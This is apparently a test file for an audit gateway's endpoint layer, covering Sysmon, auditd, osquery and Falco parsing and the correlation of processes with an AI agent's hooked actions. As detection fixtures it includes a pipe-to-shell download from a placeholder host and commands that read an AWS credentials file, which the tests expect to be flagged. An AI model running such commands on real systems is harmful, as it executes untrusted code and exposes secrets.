// Audit layer three: endpoint telemetry. Parsers are checked against records
// shaped like each sensor's real output; correlation and ingest run through a
// live in-process gateway, with a Claude Code hook supplying the audited
// action that should explain the processes Sysmon then reports.

import { test, describe, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn } from "node:child_process";

const DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "tollpike-audit3-"));
const { freePort } = await import("./fixtures/free-port.mjs");
const PORT = await freePort();
const BASE = `http://127.0.0.1:${PORT}`;
const root = path.join(import.meta.dirname, "..");
process.env.TOLLPIKE_DATA_DIR = DATA_DIR;
process.env.TOLLPIKE_ENV_FILE = path.join(DATA_DIR, "no-such.env");
process.env.TOLLPIKE_SECRET = "audit-layer3-test-secret";
process.env.PORT = String(PORT);
process.env.BIND_HOST = "127.0.0.1";
delete process.env.TOLLPIKE_AUDIT;
for (const k of Object.keys(process.env)) if (/_API_KEY$/.test(k)) delete process.env[k];

const parsers = await import("../src/audit/endpoint/parsers.js");
const { ProcessTables, findExplanation } = await import("../src/audit/endpoint/correlate.js");
const log = await import("../src/audit/log.js");
const agents = await import("../src/audit/agents.js");

const events = () => log.readEvents();
const ofType = (type) => events().filter((e) => e.type === type);
const lastOf = (type) => ofType(type).at(-1);

// --- fixtures shaped like real sensor output ---------------------------------

const sysmonXml = (id, data, recordId = 1) =>
  `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>${id}</EventID><EventRecordID>${recordId}</EventRecordID><Computer>dev-laptop</Computer></System><EventData>${Object.entries(data)
    .map(([k, v]) => `<Data Name='${k}'>${String(v).replace(/&/g, "&amp;").replace(/</g, "&lt;")}</Data>`)
    .join("")}</EventData></Event>`;

const now = () => new Date().toISOString().replace("T", " ").replace("Z", "");

describe("parsers", () => {
  test("Sysmon XML: process, network, file and DNS events", () => {
    const xml = [
      sysmonXml(1, { UtcTime: "2026-10-03 08:00:00.000", ProcessId: 4242, ParentProcessId: 100, Image: "C:\\Program Files\\Git\\bin\\bash.exe", CommandLine: 'bash -c "npm test && echo <done>"', CurrentDirectory: "C:\\work\\", User: "DEV\\faisal" }),
      sysmonXml(3, { UtcTime: "2026-10-03 08:00:01.000", ProcessId: 4242, Image: "C:\\x\\curl.exe", DestinationHostname: "api.openai.com", DestinationIp: "1.2.3.4", DestinationPort: 443 }),
      sysmonXml(11, { UtcTime: "2026-10-03 08:00:02.000", ProcessId: 4242, Image: "C:\\x\\bash.exe", TargetFilename: "C:\\Users\\f\\.ssh\\id_rsa" }),
      sysmonXml(22, { UtcTime: "2026-10-03 08:00:03.000", ProcessId: 4242, Image: "C:\\x\\bash.exe", QueryName: "api.anthropic.com" }),
      sysmonXml(5, { UtcTime: "2026-10-03 08:00:04.000", ProcessId: 4242 })
    ].join("\r\n");
    const r = parsers.parseSysmon(xml);
    assert.deepEqual(r.events.map((e) => e.kind), ["process", "network", "file", "dns"]);
    assert.equal(r.skipped, 1, "event id 5 is not imported");
    const p = r.events[0];
    assert.equal(p.pid, 4242);
    assert.equal(p.ppid, 100);
    assert.equal(p.commandLine, 'bash -c "npm test && echo <done>"', "XML entities are decoded");
    assert.equal(p.host, "dev-laptop");
    assert.equal(p.ts, "2026-10-03T08:00:00.000Z", "Sysmon's zoneless UtcTime is read as UTC");
    assert.equal(r.events[1].destHost, "api.openai.com");
    assert.equal(r.events[3].query, "api.anthropic.com");
  });

  test("Sysmon JSON: Winlogbeat and flat shapes", () => {
    const r = parsers.parseSysmon([
      { winlog: { event_id: 1, computer_name: "wl-host", event_data: { ProcessId: "7", ParentProcessId: "6", Image: "C:\\a.exe", CommandLine: "a --x", UtcTime: "2026-10-03 08:00:00.000" } } },
      { EventID: 1, ProcessId: 9, ParentProcessId: 7, Image: "C:\\b.exe", CommandLine: "b", Computer: "flat-host" }
    ]);
    assert.equal(r.events.length, 2);
    assert.equal(r.events[0].host, "wl-host");
    assert.equal(r.events[0].pid, 7);
    assert.equal(r.events[1].host, "flat-host");
  });

  test("auditd: records grouped by serial, hex arguments decoded", () => {
    const text = [
      'type=SYSCALL msg=audit(1759478400.123:901): arch=c000003e syscall=59 success=yes exit=0 ppid=500 pid=501 auid=1000 uid=1000 comm="rm" exe="/usr/bin/rm" key=(null)',
      "type=EXECVE msg=audit(1759478400.123:901): argc=3 a0=\"rm\" a1=\"-rf\" a2=2F746D702F6D7920646972",
      'type=CWD msg=audit(1759478400.123:901): cwd="/home/dev/repo"',
      'type=SYSCALL msg=audit(1759478401.000:902): syscall=263 success=yes pid=501 ppid=500 auid=1000 exe="/usr/bin/rm"',
      'type=PATH msg=audit(1759478401.000:902): item=0 name="/home/dev/.aws/credentials" nametype=DELETE',
      "garbage line"
    ].join("\n");
    const r = parsers.parseAuditd(text, { host: "linux-box" });
    assert.equal(r.skipped, 1);
    const p = r.events.find((e) => e.kind === "process");
    assert.equal(p.commandLine, "rm -rf /tmp/my dir", "a hex-encoded argument with a space is decoded");
    assert.equal(p.image, "/usr/bin/rm");
    assert.equal(p.cwd, "/home/dev/repo");
    assert.equal(p.ppid, 500);
    assert.equal(p.host, "linux-box");
    const f = r.events.find((e) => e.kind === "file");
    assert.equal(f.path, "/home/dev/.aws/credentials");
    assert.equal(f.action, "delete");
  });

  test("osquery: event and snapshot lines", () => {
    const lines = [
      JSON.stringify({ name: "process_events", hostIdentifier: "mac-1", unixTime: 1759478400, columns: { pid: "50", parent: "40", path: "/bin/zsh", cmdline: "zsh -c ls", cwd: "/Users/d" }, action: "added" }),
      JSON.stringify({ name: "pack_processes", hostIdentifier: "mac-1", snapshot: [{ pid: "40", parent: "1", path: "/usr/local/bin/claude", cmdline: "claude" }] }),
      JSON.stringify({ name: "socket_events", hostIdentifier: "mac-1", columns: { pid: "50", path: "/usr/bin/curl", remote_address: "1.1.1.1", remote_port: "443" } })
    ].join("\n");
    const r = parsers.parseOsquery(lines);
    assert.deepEqual(r.events.map((e) => e.kind), ["process", "snapshot", "network"]);
    assert.equal(r.events[0].ppid, 40);
    assert.equal(r.events[1].image, "/usr/local/bin/claude");
  });

  test("Falco: process and connect alerts", () => {
    const r = parsers.parseFalco([
      { time: "2026-10-03T08:00:00.000Z", rule: "Terminal shell", output_fields: { "proc.pid": 10, "proc.ppid": 9, "proc.cmdline": "sh -c id", "proc.exepath": "/bin/sh", "evt.type": "execve", "user.name": "dev" } },
      { time: "2026-10-03T08:00:01.000Z", output_fields: { "proc.pid": 10, "proc.exepath": "/usr/bin/curl", "evt.type": "connect", "fd.name": "10.0.0.2:5000->104.18.1.1:443" } }
    ]);
    assert.deepEqual(r.events.map((e) => e.kind), ["process", "network"]);
    assert.equal(r.events[1].destIp, "104.18.1.1");
    assert.equal(r.events[1].destPort, 443);
  });

  test("bad input is counted, never thrown", () => {
    assert.equal(parsers.parseNative("{not json\n{\"kind\":\"process\",\"pid\":1}").skipped, 1);
    assert.equal(parsers.parseEndpoint("nope", "").error.includes("Unknown format"), true);
    assert.equal(parsers.parseSysmon("<Event><EventID>1</EventID>").events.length, 0);
  });
});

describe("provider connections without Sysmon", () => {
  const PROVIDERS = ["api.openai.com", "api.anthropic.com", "openrouter.ai"];
  test("a connection is matched to a provider through the DNS cache, and nothing else is sent", async () => {
    const { matchProviderConnections } = await import("../src/audit/endpoint/collect.js");
    const parsed = {
      c: [
        { RemoteAddress: "160.79.104.10", RemotePort: 443, OwningProcess: 4242 },
        { RemoteAddress: "104.18.33.45", RemotePort: 443, OwningProcess: 4343 },
        { RemoteAddress: "142.250.74.78", RemotePort: 443, OwningProcess: 5555 },
        { RemoteAddress: "10.0.0.9", RemotePort: 22, OwningProcess: 6666 }
      ],
      d: [
        { Entry: "api.anthropic.com", Data: "160.79.104.10" },
        { Entry: "eu.openrouter.ai.", Data: "104.18.33.45" },
        { Entry: "www.google.com", Data: "142.250.74.78" }
      ]
    };
    const events = matchProviderConnections(parsed, PROVIDERS, { host: "dev-laptop", ts: "2026-10-05T12:00:00.000Z" });
    assert.deepEqual(events.map((e) => [e.pid, e.destHost]), [[4242, "api.anthropic.com"], [4343, "eu.openrouter.ai."]]);
    assert.ok(events.every((e) => e.kind === "network" && e.host === "dev-laptop" && e.destPort === 443));
    assert.ok(!events.some((e) => /google/.test(e.destHost)), "traffic to other sites never leaves the machine");
  });

  test("a single connection or cache entry (PowerShell unwraps one-item arrays) still matches", async () => {
    const { matchProviderConnections } = await import("../src/audit/endpoint/collect.js");
    const events = matchProviderConnections(
      { c: { RemoteAddress: "1.2.3.4", RemotePort: 443, OwningProcess: 7 }, d: { Entry: "api.openai.com", Data: "1.2.3.4" } },
      PROVIDERS
    );
    assert.equal(events.length, 1);
    assert.equal(events[0].destHost, "api.openai.com");
    assert.deepEqual(matchProviderConnections({}, PROVIDERS), []);
  });
});

describe("correlation", () => {
  const h = "dev-laptop";
  const ts = (s) => new Date(Date.parse("2026-10-03T08:00:00Z") + s * 1000).toISOString();

  test("processes are attributed through their ancestry to an agent runtime", () => {
    const t = new ProcessTables();
    t.upsert({ host: h, pid: 1, ppid: 0, image: "C:\\Windows\\explorer.exe", ts: ts(0) });
    t.upsert({ host: h, pid: 10, ppid: 1, image: "C:\\Program Files\\nodejs\\node.exe", commandLine: "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js", ts: ts(0) });
    const bash = t.upsert({ host: h, pid: 20, ppid: 10, image: "C:\\Git\\bin\\bash.exe", commandLine: "bash -c npm test", ts: ts(1) });
    const npm = t.upsert({ host: h, pid: 30, ppid: 20, image: "C:\\nodejs\\node.exe", commandLine: "node npm-cli.js test", ts: ts(2) });
    const other = t.upsert({ host: h, pid: 40, ppid: 1, image: "C:\\Windows\\notepad.exe", ts: ts(3) });
    assert.equal(t.classify(h, t.get(h, 10)).isRoot, true);
    assert.equal(t.classify(h, bash).runtime, "claude");
    assert.equal(t.classify(h, npm).root.pid, 10);
    assert.equal(t.classify(h, other).runtime, null);
  });

  test("a runtime's own helpers are recognised", () => {
    const t = new ProcessTables();
    t.upsert({ host: h, pid: 1, ppid: 0, image: "C:\\Apps\\Claude.exe", ts: ts(0) });
    const renderer = t.upsert({ host: h, pid: 2, ppid: 1, image: "C:\\Apps\\Claude.exe", commandLine: "Claude.exe --type=renderer", ts: ts(0) });
    const rg = t.upsert({ host: h, pid: 3, ppid: 1, image: "C:\\tools\\rg.exe", commandLine: "rg --json foo", ts: ts(0) });
    const gitStatus = t.upsert({ host: h, pid: 4, ppid: 1, image: "C:\\Git\\cmd\\git.exe", commandLine: "git status --porcelain", ts: ts(0) });
    const gitPush = t.upsert({ host: h, pid: 5, ppid: 1, image: "C:\\Git\\cmd\\git.exe", commandLine: "git push --force", ts: ts(0) });
    assert.equal(t.classify(h, renderer).helper, true, "a same-image child (an Electron renderer) is the runtime itself, not an action");
    assert.equal(t.classify(h, rg).helper, true);
    assert.equal(t.classify(h, gitStatus).helper, true);
    assert.equal(t.classify(h, gitPush).helper, false, "a git command that changes things is never a helper");
  });

  test("a reused pid loses the previous process's explanation", () => {
    const t = new ProcessTables();
    const first = t.upsert({ host: h, pid: 77, ppid: 1, image: "a", ts: ts(0) });
    first.explainedBy = { eventId: "evt_x" };
    const second = t.upsert({ host: h, pid: 77, ppid: 1, image: "b", ts: ts(60) });
    assert.equal(second.explainedBy, null);
  });

  test("a snapshot of a process still running keeps its explanation", () => {
    const t = new ProcessTables();
    const p = t.upsert({ kind: "process", host: h, pid: 88, ppid: 1, image: "bash", ts: ts(0) });
    p.explainedBy = { eventId: "evt_y" };
    assert.equal(t.upsert({ kind: "snapshot", host: h, pid: 88, ppid: 1, image: "bash", ts: ts(600) }).explainedBy?.eventId, "evt_y");
    assert.equal(t.upsert({ kind: "snapshot", host: h, pid: 88, ppid: 1, image: "curl", ts: ts(700) }).explainedBy, null, "a different image is pid reuse");
  });

  test("a full table evicts ordinary processes before agent runtimes", () => {
    const t = new ProcessTables();
    t.upsert({ host: h, pid: 1, ppid: 0, image: "C:\\bin\\claude.exe", ts: ts(0) });
    for (let pid = 2; pid <= 50_001; pid++) t.upsert({ host: h, pid, ppid: 1, image: "x", ts: ts(0) });
    assert.ok(t.get(h, 1), "the runtime root was evicted");
    assert.equal(t.get(h, 2), null);
  });

  test("a parent cycle in bad data does not hang", () => {
    const t = new ProcessTables();
    t.upsert({ host: h, pid: 1, ppid: 2, image: "a", ts: ts(0) });
    const b = t.upsert({ host: h, pid: 2, ppid: 1, image: "b", ts: ts(0) });
    assert.equal(t.classify(h, b).runtime, null);
  });

  test("an action explains the shell that ran it and the pieces it spawned, within the window", () => {
    const actions = [{ ts: ts(0), command: "cd repo && rm -rf build", eventId: "evt_a", type: "tool.requested" }];
    assert.equal(findExplanation({ commandLine: 'bash -c "cd repo && rm -rf build"', ts: ts(1) }, actions)?.eventId, "evt_a");
    assert.equal(findExplanation({ commandLine: "rm -rf build", ts: ts(1) }, actions)?.eventId, "evt_a");
    assert.equal(findExplanation({ commandLine: "rm -rf build", ts: ts(1000) }, actions), null, "too long after the action");
    assert.equal(findExplanation({ commandLine: "node", ts: ts(1) }, [{ ts: ts(0), command: "node build.js", eventId: "evt_b" }]), null, "a short command line is not a piece of everything");
  });

  test("an action on one machine never explains a process on another", async () => {
    const { runWithContext } = await import("../src/audit/context.js");
    const audit = await import("../src/audit/index.js");
    const { ingestEndpoint } = await import("../src/audit/endpoint/index.js");
    const cmd = `npm run cross-host-${Date.now()}`;
    runWithContext({ ip: "10.0.0.5", source: "claude-code" }, () => audit.recordToolRequest({ source: "claude-code", tool: "Bash", input: { command: cmd }, toolUseId: "tu_cross" }));
    const at = new Date().toISOString();
    const batch = (pidBase) => [
      { kind: "snapshot", pid: pidBase, ppid: 0, image: "C:\\Users\\x\\.local\\bin\\claude.exe", ts: at },
      { kind: "process", pid: pidBase + 1, ppid: pidBase, image: "C:\\Git\\bin\\bash.exe", commandLine: `bash -c "${cmd}"`, ts: at }
    ];
    const ingest = (ip, pidBase) => runWithContext({ ip, source: "endpoint" }, () => ingestEndpoint({ format: "native", body: batch(pidBase), host: `host-${ip}`, sensor: "test" }));
    ingest("127.0.0.1", 91000);
    const local = ofType("endpoint.process").find((e) => e.pid === 91001);
    assert.equal(local.explainedBy, null, "a sensor on this machine was explained by a hook from 10.0.0.5");
    ingest("10.0.0.5", 92000);
    const remote = ofType("endpoint.process").find((e) => e.pid === 92001);
    assert.ok(remote.explainedBy?.eventId, "the sensor on the hook's own machine is explained");
  });
});

// --- end to end ---------------------------------------------------------------

describe("over HTTP", () => {
  let sensorKey;
  let agentKey;
  const HOST = "dev-laptop";

  const ingest = async (format, body, { key = sensorKey, text = false } = {}) => {
    const res = await fetch(`${BASE}/audit/endpoint/events?format=${format}&host=${HOST}`, {
      method: "POST",
      headers: { "content-type": text ? "text/plain" : "application/json", ...(key ? { authorization: `Bearer ${key}` } : {}) },
      body: text ? body : JSON.stringify(body)
    });
    return { status: res.status, json: await res.json().catch(() => null) };
  };
  const hookPre = (command) =>
    fetch(`${BASE}/audit/hooks/claude-code`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${agentKey}` },
      body: JSON.stringify({ hook_event_name: "PreToolUse", session_id: "s1", tool_name: "Bash", tool_input: { command }, tool_use_id: "toolu_e2e" })
    });

  before(async () => {
    sensorKey = agents.createAgent("laptop-sensor", { kind: "sensor" }).key;
    agentKey = agents.createAgent("claude-code-laptop").key;
    await import("../src/server.js");
    for (let i = 0; i < 50; i++) {
      try {
        if ((await fetch(`${BASE}/health`)).ok) break;
      } catch {
        await new Promise((r) => setTimeout(r, 100));
      }
    }
  });

  test("keys stay in their lanes", async () => {
    assert.equal((await ingest("native", [], { key: null })).status, 401, "a sensor key is required once sensor keys exist");
    assert.equal((await ingest("native", [], { key: agentKey })).status, 403, "an agent cannot submit telemetry about itself");
    const r = await fetch(`${BASE}/v1/models`, { headers: { authorization: `Bearer ${sensorKey}` } });
    assert.equal(r.status, 403, "a sensor key cannot call models");
    assert.equal((await ingest("bogus", [])).status, 400);
  });

  test("a snapshot seeds the process table and records nothing by itself", async () => {
    const before = events().length;
    const r = await ingest("native", [
      { kind: "snapshot", pid: 1, ppid: 0, image: "C:\\Windows\\explorer.exe" },
      { kind: "snapshot", pid: 100, ppid: 1, image: "C:\\Apps\\Claude\\claude.exe", commandLine: "claude" }
    ]);
    assert.equal(r.status, 200);
    assert.equal(r.json.received, 2);
    const added = events().slice(before).filter((e) => e.type !== "endpoint.sensor");
    assert.equal(added.length, 0);
  });

  test("a process the agent's hook announced is explained and attributed to that agent", async () => {
    await hookPre("npm test");
    const r = await ingest(
      "sysmon",
      [
        sysmonXml(1, { UtcTime: now(), ProcessId: 200, ParentProcessId: 100, Image: "C:\\Git\\bin\\bash.exe", CommandLine: 'bash -c "npm test"' }, 10),
        sysmonXml(1, { UtcTime: now(), ProcessId: 201, ParentProcessId: 200, Image: "C:\\nodejs\\node.exe", CommandLine: "node jest.js" }, 11)
      ].join("\n"),
      { text: true }
    );
    assert.equal(r.json.recorded, 2);
    assert.equal(r.json.unexplained, 0);
    const procs = ofType("endpoint.process").slice(-2);
    assert.equal(procs[0].explainedBy.type, "tool.requested");
    assert.equal(procs[0].explainedBy.toolUseId, "toolu_e2e");
    assert.equal(procs[0].agent.name, "claude-code-laptop", "attribution comes from the matched hook event");
    assert.equal(procs[1].explainedBy.inherited, true, "the child inherits its parent's explanation");
    assert.equal(procs[0].agentRuntime, "claude");
    assert.ok(!procs[0].flagged);
  });

  test("a process no audited action explains is flagged", async () => {
    const r = await ingest("native", [{ kind: "process", pid: 300, ppid: 100, image: "C:\\x\\curl.exe", commandLine: "curl -s https://x.example.org/p.sh | sh", ts: new Date().toISOString() }]);
    assert.equal(r.json.unexplained, 1);
    const p = lastOf("endpoint.process");
    assert.equal(p.explainedBy, null);
    assert.equal(p.flagged, true);
    assert.ok(p.findings.some((f) => f.rule === "endpoint.unexplained_agent_activity"));
    assert.ok(p.findings.some((f) => f.rule === "shell.remote_exec"));
    assert.ok(p.commandLineHash);
  });

  test("helpers and processes outside agent trees are counted, not recorded", async () => {
    const before = ofType("endpoint.process").length;
    const r = await ingest("native", [
      { kind: "process", pid: 400, ppid: 100, image: "C:\\Apps\\Claude\\claude.exe", commandLine: "claude --type=renderer", ts: new Date().toISOString() },
      { kind: "process", pid: 401, ppid: 100, image: "C:\\tools\\rg.exe", commandLine: "rg foo", ts: new Date().toISOString() },
      { kind: "process", pid: 402, ppid: 1, image: "C:\\Windows\\notepad.exe", commandLine: "notepad", ts: new Date().toISOString() }
    ]);
    assert.equal(r.json.ignored, 3);
    assert.equal(ofType("endpoint.process").length, before);
  });

  test("a process whose parent was never seen is counted as orphaned, not silently dropped", async () => {
    const r = await ingest("native", [{ kind: "process", pid: 700, ppid: 99999, image: "C:/x/tool.exe", commandLine: "tool --go", ts: new Date().toISOString() }]);
    assert.equal(r.json.orphaned, 1);
    assert.equal(r.json.recorded, 0);
  });

  test("a credential file touched inside an agent's tree is recorded", async () => {
    const t0 = Math.floor(Date.now() / 1000);
    const text = [
      `type=SYSCALL msg=audit(${t0}.100:50): syscall=59 success=yes ppid=100 pid=500 auid=1000 exe="/usr/bin/cat"`,
      `type=EXECVE msg=audit(${t0}.100:50): argc=2 a0="cat" a1="/home/dev/.aws/credentials"`,
      `type=SYSCALL msg=audit(${t0}.200:51): syscall=257 success=yes ppid=100 pid=500 auid=1000 exe="/usr/bin/cat"`,
      `type=PATH msg=audit(${t0}.200:51): item=0 name="/home/dev/.aws/credentials" nametype=NORMAL`
    ].join("\n");
    const r = await ingest("auditd", text, { text: true });
    assert.equal(r.status, 200, JSON.stringify(r.json));
    const f = lastOf("endpoint.file");
    assert.equal(f.path, "/home/dev/.aws/credentials");
    assert.ok(f.findings.some((x) => x.rule === "path.sensitive"));
  });

  test("a model provider reached around the gateway is flagged once per hour", async () => {
    const before = ofType("endpoint.network").length;
    const dns = (pid) => sysmonXml(22, { UtcTime: now(), ProcessId: pid, Image: "C:\\Program Files\\Chrome\\chrome.exe", QueryName: "api.openai.com" });
    await ingest("native", [{ kind: "snapshot", pid: 900, ppid: 1, image: "C:\\Program Files\\Chrome\\chrome.exe" }]);
    const r = await ingest("sysmon", [dns(900), dns(900), dns(900)].join("\n"), { text: true });
    assert.equal(r.json.recorded, 1);
    const added = ofType("endpoint.network").slice(before);
    assert.equal(added.length, 1);
    assert.ok(added[0].findings.some((f) => f.rule === "endpoint.direct_provider_access"));
    assert.equal(added[0].destHost, "api.openai.com");
  });

  test("the gateway host's own provider traffic is not a bypass", async () => {
    const before = ofType("endpoint.network").length;
    const res = await fetch(`${BASE}/audit/endpoint/events?format=native&host=${encodeURIComponent(os.hostname())}`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${sensorKey}` },
      body: JSON.stringify([{ kind: "network", pid: process.pid, image: process.execPath, destHost: "api.anthropic.com", destPort: 443 }])
    });
    assert.equal(res.status, 200);
    assert.equal(ofType("endpoint.network").length, before);
  });

  test("each sensor leaves a heartbeat, so the record shows monitoring ran", () => {
    const hb = ofType("endpoint.sensor");
    assert.ok(hb.length >= 1);
    assert.ok(hb.some((e) => e.sensor === "laptop-sensor"));
  });

  test("the send CLI ships a file and prints the counts", async () => {
    const file = path.join(DATA_DIR, "batch.ndjson");
    fs.writeFileSync(file, JSON.stringify({ kind: "process", pid: 600, ppid: 100, image: "/bin/ls", commandLine: "ls -la /", ts: new Date().toISOString() }) + "\n");
    const child = spawn(process.execPath, ["bin/tollpike.mjs", "endpoint", "send", "--format", "native", "--host", HOST, "--url", BASE, file], { cwd: root, env: { ...process.env, TOLLPIKE_SENSOR_KEY: sensorKey } });
    let out = "";
    let err = "";
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (err += d));
    const code = await new Promise((r) => child.on("close", r));
    assert.equal(code, 0, err);
    assert.match(out, /received 1, recorded 1, unexplained 1/);
  });

  test("status and evidence describe the endpoint layer, and the chain holds", async () => {
    const audit = await import("../src/audit/index.js");
    const s = audit.auditStatus();
    assert.ok(s.sees.some((x) => /endpoint sensor/.test(x)));
    assert.ok(audit.CONTROL_MAP.some((c) => /endpoint/.test(c.iso)));
    const { getSettings } = await import("../src/storage/settings.js");
    const st = await (await fetch(`${BASE}/api/panel/audit/endpoint`, { headers: { authorization: `Bearer ${getSettings().gatewayApiKey}` } })).json();
    assert.ok(st.sensors.some((x) => x.sensor === "laptop-sensor"));
    const v = log.verifyAudit();
    assert.equal(v.intact, true, JSON.stringify(v));
    const raw = fs.readFileSync(log.logPath, "utf8");
    assert.ok(!raw.includes(sensorKey) && !raw.includes(agentKey));
  });
});

after(() => {
  setTimeout(() => process.exit(0), 50).unref();
});
